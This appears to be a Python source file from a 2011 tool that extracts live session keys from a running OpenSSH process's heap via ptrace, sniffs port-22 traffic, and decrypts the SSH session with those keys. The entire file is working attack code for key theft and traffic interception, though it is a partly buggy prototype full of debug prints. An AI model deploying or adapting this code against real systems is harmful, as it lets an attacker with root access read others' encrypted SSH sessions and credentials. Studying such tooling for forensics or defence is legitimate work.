#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (C) 2011 Loic Jaquemet loic.jaquemet+python@gmail.com
#

__author__ = "Loic Jaquemet loic.jaquemet+python@gmail.com"

import os,logging,sys
#use volatility?

import abouchet
import ctypes, model, ctypes_openssh
from ctypes_openssh import AES_BLOCK_SIZE

# linux only
from ptrace.debugger.debugger import PtraceDebugger
from ptrace.debugger.memory_mapping import readProcessMappings

from paramiko.packet import Packetizer, NeedRekeyException
from paramiko.transport import Transport
from paramiko import util
from paramiko.util import Counter
from paramiko.common import *

log=logging.getLogger('sslsnoop.openssh')

from ctypes import cdll

libopenssl=cdll.LoadLibrary('libssl.so')



def testDecrypt(packetizer):
  _expected_packet = tuple()
  while ( True ):
    try:
      ptype, m = packetizer.read_message()
    except NeedRekeyException:
      continue
    if ptype == MSG_IGNORE:
      continue
    elif ptype == MSG_DISCONNECT:
      print "DISCONNECT MESSAGE"
      print m
      packetizer.close()
      break
    elif ptype == MSG_DEBUG:
      always_display = m.get_boolean()
      msg = m.get_string()
      lang = m.get_string()
      log.debug('Debug msg: ' + util.safe_string(msg))
      continue
    if len(_expected_packet) > 0:
      if ptype not in _expected_packet:
        raise SSHException('Expecting packet from %r, got %d' % (_expected_packet, ptype))
      _expected_packet = tuple()
      if (ptype >= 30) and (ptype <= 39):
        print "KEX Message, we need to rekey"
        continue
  print 'Test descrypt Finished'  




class StatefulAESEngine():
  #ctx->cipher->do_cipher(ctx,out,in,inl);
  # -> openssl.AES_ctr128_encrypt(&in,&out,length,&aes_key, ivecArray, ecount_bufArray, &num )
  #AES_encrypt(ivec, ecount_buf, key); # aes_key is struct with cnt, key is really AES_KEY->aes_ctx
  #AES_ctr128_inc(ivec); #ssh_Ctr128_inc semble etre different, mais paramiko le fait non ?
  def __init__(self, context ):
    self.context= context
    self.aes_key = context.app_data 
    # we need nothing else
    self.key = self.aes_key.aes_ctx
    self._AES_encrypt=libopenssl.AES_encrypt
    print 'cipher:%s block_size: %d key_len: %d '%(context.name, context.block_size, context.key_len)
  
  def decrypt(self,block):
    bLen=len(block)
    if bLen % AES_BLOCK_SIZE:
      log.error("Sugar, why do you give me a block the wrong size: %d not modulo of %d"%(bLen, AES_BLOCK_SIZE))
      return None
    dest=(ctypes.c_ubyte*bLen)()
    if not self.ssh_aes_ctr(self.aes_key, dest, block, bLen ) :
      return None
    return model.array2bytes(dest)
        
  def ssh_aes_ctr(self, aes_key, dest, src, srcLen ):
    # a la difference de ssh on ne prends pas l'EVP_context mais le ssh context
    #  parceque j'ai pas un evp_cipher_ctx_evp_app_data pour l'isntant
    n = 0
    buf=(ctypes.c_ubyte*AES_BLOCK_SIZE)()
    if srcLen==0:
      return True
    if not bool(aes_key):
      return False
    print 'src is a %s , dest is a %s and buf is a %s'%(type(src), dest, buf)
    print 'src[0] is a %s , dest[0] is a %s and buf[0] is a %s'%(type(src[0]), dest[0], buf[0])
    for i in range(0,srcLen):
      if (n == 0):
        # on ne bosse que sur le block_size ( ivec, dst, key )
        self._AES_encrypt(ctypes.byref(aes_key.aes_counter), ctypes.byref(buf), ctypes.byref(aes_key.aes_ctx))
        self.ssh_ctr_inc(aes_key.aes_counter, AES_BLOCK_SIZE)
      # on recopie le resultat pour chaque byte du block
      dest[i] = ord(src[i]) ^ buf[i]
      n = (n + 1) % AES_BLOCK_SIZE
    return True

  def ssh_ctr_inc(self, ctr, ctrLen):
    '''
    @param ctr: a ubyte array
        l'implementation ssh semble etre differente de l'implementation Openssl...
    int i=0;
    for (i = len - 1; i >= 0; i--)
      if (++ctr[i])  /* continue on overflow */
        return;
    '''
    for i in range(len(ctr)-1,-1,-1):
      ctr[i]+=1
      if ctr[i] != 0:
        return



def activate_cipher(packetizer, context):
  "switch on newly negotiated encryption parameters for inbound traffic"
  #packetizer.set_log(log)
  engine = StatefulAESEngine(context)
  print 'cipher:%s block_size: %d key_len: %d '%(context.name, context.block_size, context.key_len )
  print engine, type(engine)

  mac = context.mac
  if mac is not None:
    mac_key    = mac.getKey()
    mac_engine = Transport._mac_info[mac.name.toString()]['class']
  # fix our engines in packetizer
  packetizer.set_inbound_cipher(engine, context.block_size, mac_engine, mac.mac_len , mac_key)
  '''  
  compress_in = self._compression_info[self.remote_compression][1]
  if (compress_in is not None) and ((self.remote_compression != 'zlib@openssh.com') or self.authenticated):
      self._log(DEBUG, 'Switching on inbound compression ...')
      self.packetizer.set_inbound_compressor(compress_in())
  '''
  return
  
def decryptSSHTraffic(scapySocket,ciphers):
  receiveCtx,sendCtx = ciphers.getCiphers()
  # Inbound
  inbound = Packetizer(scapySocket.getInboundSocket())
  activate_cipher(inbound, receiveCtx )
  
  testDecrypt(inbound)
  
  # out bound
  outbound = Packetizer(scapySocket.getOutboundSocket())
  activate_cipher(outbound, sendCtx )
  return

def launchScapyThread():
  import socket_scapy
  from threading import Thread
  # @ at param
  port=22
  sshfilter="tcp and port %d"%(port)
  #
  soscapy=socket_scapy.socket_scapy(sshfilter,packetCount=100)
  sniffer = Thread(target=soscapy.run)
  soscapy.setThread(sniffer)
  sniffer.start()
  log.info('Please make some ssh  traffic')
  return soscapy


class CipherContext:
  '''
  fields=    enc. mac , comp 
      sshCtx ,  sshCipher 
      evpCtx , evpCipher 
      name #cipher name
      key , key_len 
      iv  , block_size 
      app_data  
  '''
  pass

class SessionCiphers():
  def __init__(self,session_state):
    self.sessions_state=session_state
    # two ciphers    
    self.receiveCtx=CipherContext()
    self.sendCtx=CipherContext()
    # read cipher MODE_IN == 0
    MODE=0
    for ctx in [self.receiveCtx, self.sendCtx]:
      ctx.enc =  self.sessions_state.newkeys[MODE].contents.enc
      ctx.mac =  self.sessions_state.newkeys[MODE].contents.mac
      ctx.comp = self.sessions_state.newkeys[MODE].contents.comp
      ctx.sshCtx = session_state.receive_context
      ctx.sshCipher = ctx.sshCtx.cipher.contents
      ctx.evpCtx    = ctx.sshCtx.evp
      ctx.evpCipher = ctx.sshCtx.evp.cipher.contents
      # useful stuff
      ctx.name = ctx.sshCipher.name.toString()
      ctx.key  = ctx.enc.getKey()
      ctx.key_len  = ctx.enc.key_len
      ctx.iv   = ctx.enc.getIV()
      ctx.block_size  = ctx.enc.block_size
      ctx.app_data  = ctx.sshCtx.getEvpAppData() 
      MODE+=1
    # 
    return

  def getCiphers(self):
    return self.receiveCtx, self.sendCtx
  
  def __str__(self):
    return "<SessionCiphers RECEIVE: '%s' SEND: '%s' >"%(self.receiveCtx.name,self.sendCtx.name)




def findActiveSession(pid):
  
  dbg=PtraceDebugger()
  process=dbg.addProcess(pid,is_attached=False)
  if process is None:
    log.error("Error initializing Process debugging for %d"% pid)
    return None
  # process is SIGSTOP-ed
  mappings=readProcessMappings(process)
  session_state=None
  addr=None
  for m in mappings:
    ##debug, rsa is on head
    if m.pathname != '[heap]':
      continue
    if not abouchet.hasValidPermissions(m):
      continue
    ## method generic
    log.info('looking for struct session_state')
    outs=abouchet.find_struct(process, m, ctypes_openssh.session_state, maxNum=1)
    # unstop() the process
    process.cont()
    if len(outs) == 0:
      log.error("The session_state has not been found. maybe it's not OpenSSH ?")
      return None
    elif len(outs) > 1:
      log.warning("Mmmh, multiple session_state. That is odd. I'll try with the first one.")
    #
    session_state,addr=outs[0]
  return session_state,addr
  
def findActiveKeys(pid):
  session_state,addr=findActiveSession(pid)
  if session_state is None:
    return None # raise Exception ... 
  ciphers=SessionCiphers(session_state)
  log.info('Active state ciphers : %s at 0x%lx'%(ciphers,addr))
  return ciphers,addr

def usage(txt):
  log.error("Usage : %s <pid of ssh>"% txt)
  sys.exit(-1)


def main(argv):
  logging.basicConfig(level=logging.INFO)
  logging.debug(argv)
  if ( len(argv) < 1 ):
    usage(argv[0])
    return

  # we must have big privileges...
  if os.getuid() + os.geteuid() != 0:
    log.error("You must be root/using sudo to read memory and sniff traffic.")
    return
  
  # use optarg on v, a and to
  pid = int(argv[0])
  log.info("Target has pid %d"%pid)
  soscapy=launchScapyThread()
  ciphers,addr=findActiveKeys(pid)
  # process is running... sniffer is listening
  print addr
  decryptSSHTraffic(soscapy,ciphers)
  log.info("done for pid %d, struct at 0x%lx"%(pid,addr))
  sys.exit(0)
  return -1


if __name__ == "__main__":
  main(sys.argv[1:])

